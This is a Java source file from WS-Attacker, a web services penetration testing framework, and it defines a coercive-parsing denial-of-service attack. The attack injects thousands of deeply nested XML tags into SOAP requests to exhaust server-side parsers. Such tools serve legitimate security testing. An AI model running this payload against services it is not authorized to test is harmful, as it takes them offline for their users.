/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2013 Christian Altmeier
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package wsattacker.library.intelligentdos.dos;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.Iterator;
import java.util.List;
import wsattacker.library.intelligentdos.common.DoSParam;
import wsattacker.library.intelligentdos.helper.IterateModel;
import wsattacker.library.intelligentdos.helper.IterateModel.IncreaseIncrementStrategie;
import wsattacker.library.intelligentdos.helper.IterateModel.IterateStrategie;

/**
 * @author Christian Altmeier
 */
public class CoerciveParsing
    extends AbstractDoSAttack
{

    private final PayloadPosition[] possiblePossitions = { PayloadPosition.ELEMENT };

    private static final int MIN_NUMBER_OF_TAGS = 2;

    // 512 - 16384
    // 768 - 1024
    private static final IterateModel defaultNumberOfTags =
        IterateModel.custom().startAt( 2500 ).stopAt( 15000 ).setIncrement( 2 ).setIterateStrategie( IterateStrategie.MUL ).setIncreaseIncrementStrategie( IncreaseIncrementStrategie.NO ).build();

    private static final String[] defaultTagNames = { "x" };

    private String[] tagNames;

    // iterators
    private IterateModel numberOfTags;

    private Iterator<String> tagNameIterator;

    // current
    private int currentNumberOfTags;

    private String currentTagName;

    public CoerciveParsing()
    {
        try
        {
            numberOfTags = defaultNumberOfTags.clone();
        }
        catch ( CloneNotSupportedException e )
        {
            LOG.warn( e );
        }

        tagNames = defaultTagNames;
        tagNameIterator = Arrays.asList( defaultTagNames ).iterator();
    }

    @Override
    public String getName()
    {
        return "CoerciveParsing";
    }

    @Override
    public PayloadPosition[] getPossiblePossitions()
    {
        PayloadPosition[] copy = new PayloadPosition[possiblePossitions.length];
        System.arraycopy( possiblePossitions, 0, copy, 0, possiblePossitions.length );
        return copy;
    }

    public IterateModel getNumberOfTagsIterator()
    {
        return numberOfTags;
    }

    public void setNumberOfTagsIterator( IterateModel iterateModel )
    {
        if ( iterateModel == null )
        {
            throw new IllegalArgumentException( "NumberOfTagsIterator may not be null" );
        }

        numberOfTags = iterateModel;
    }

    public String[] getTagNames()
    {
        String[] copy = new String[tagNames.length];
        System.arraycopy( tagNames, 0, copy, 0, tagNames.length );
        return copy;
    }

    public void setTagNames( String[] tagNames )
    {
        if ( tagNames == null || tagNames.length == 0 )
        {
            throw new IllegalArgumentException( "elements may not be null" );
        }

        this.tagNames = new String[tagNames.length];
        System.arraycopy( tagNames, 0, this.tagNames, 0, tagNames.length );
        this.tagNameIterator = Arrays.asList( tagNames ).iterator();
    }

    @Override
    public boolean hasFurtherParams()
    {
        return numberOfTags.hasNext() || tagNameIterator.hasNext();
    }

    @Override
    public void nextParam()
    {
        if ( !initialized )
        {
            currentNumberOfTags = numberOfTags.next();
            currentTagName = tagNameIterator.next();

            initialized = true;
        }
        else if ( numberOfTags.hasNext() )
        {
            currentNumberOfTags = numberOfTags.next();
        }
        else if ( tagNameIterator.hasNext() )
        {
            numberOfTags.reset();
            currentNumberOfTags = numberOfTags.next();

            currentTagName = tagNameIterator.next();
        }
    }

    @Override
    public List<DoSParam<?>> getCurrentParams()
    {
        List<DoSParam<?>> list = new ArrayList<DoSParam<?>>();
        list.add( new DoSParam<Integer>( "Number of Tags", currentNumberOfTags ) );
        list.add( new DoSParam<String>( "Tag name", currentTagName ) );
        return list;
    }

    @Override
    int getCommentLength( PayloadPosition payloadPosition )
    {
        int length = 2 * currentNumberOfTags * ( currentTagName.length() + 2 ) + currentNumberOfTags;
        return length;
    }

    @Override
    public String getTamperedRequest( String xml, PayloadPosition payloadPosition )
    {
        verifyPayloadPosition( payloadPosition );

        // generate Payload
        String elementNameOpen = "<" + currentTagName + ">";
        String elementNameClose = "</" + currentTagName + ">";

        StringBuilder sb = new StringBuilder();
        for ( int i = 0; i < currentNumberOfTags; i++ )
        {
            sb.append( elementNameOpen );
        }

        for ( int i = 0; i < currentNumberOfTags; i++ )
        {
            sb.append( elementNameClose );
        }

        return payloadPosition.replacePlaceholder( xml, sb.toString() );
    }

    @Override
    public DoSAttack minimal()
    {
        CoerciveParsing coerciveParsing = new CoerciveParsing();
        coerciveParsing.currentNumberOfTags = MIN_NUMBER_OF_TAGS;
        coerciveParsing.currentTagName = "x";
        return coerciveParsing;
    }

    @Override
    public DoSAttack middle( DoSAttack aThat )
    {
        if ( this == aThat )
        {
            CoerciveParsing coerciveParsing = new CoerciveParsing();
            coerciveParsing.currentNumberOfTags = this.currentNumberOfTags;
            return coerciveParsing;
        }

        if ( !aThat.getClass().equals( getClass() ) || !( aThat instanceof CoerciveParsing ) )
        {
            throw new IllegalArgumentException( aThat.getClass() + " is not allowed!" );
        }

        CoerciveParsing that = (CoerciveParsing) aThat;

        CoerciveParsing coerciveParsing = new CoerciveParsing();
        coerciveParsing.currentTagName = this.currentTagName;
        if ( this.currentNumberOfTags == that.currentNumberOfTags )
        {
            coerciveParsing.currentNumberOfTags = this.currentNumberOfTags;
        }
        else
        {
            coerciveParsing.currentNumberOfTags = calculateMiddle( this.currentNumberOfTags, that.currentNumberOfTags );
        }

        return coerciveParsing;
    }

    @Override
    public void initialize()
    {
        super.initialize();

        numberOfTags.reset();
        tagNameIterator = Arrays.asList( tagNames ).iterator();
    }

    @Override
    public int compareTo( DoSAttack aThat )
    {
        // this optimization is usually worthwhile, and can
        // always be added
        if ( this == aThat )
            return EQUAL;

        if ( !aThat.getClass().equals( getClass() ) )
        {
            return EQUAL;
        }

        CoerciveParsing that = (CoerciveParsing) aThat;

        if ( this.currentNumberOfTags < that.currentNumberOfTags )
            return BEFORE;
        if ( this.currentNumberOfTags > that.currentNumberOfTags )
            return AFTER;

        return EQUAL;
    }

}
